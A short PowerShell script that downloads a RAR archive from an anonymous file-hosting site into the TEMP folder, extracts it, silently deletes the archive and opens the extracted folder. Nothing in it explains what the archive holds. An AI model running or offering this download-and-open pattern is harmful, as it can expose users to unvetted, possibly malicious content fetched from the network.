$url='https://files.catbox.moe/gkzw9k.rar'
$rar="$env:TEMP\gkzw9k.rar"
$dir="$env:TEMP\gkzw9k"

Invoke-WebRequest -Uri $url -OutFile $rar
New-Item -ItemType Directory -Path $dir -Force | Out-Null
tar -xf $rar -C $dir
Remove-Item $rar -Force -ErrorAction SilentlyContinue
Start-Process explorer.exe $dir
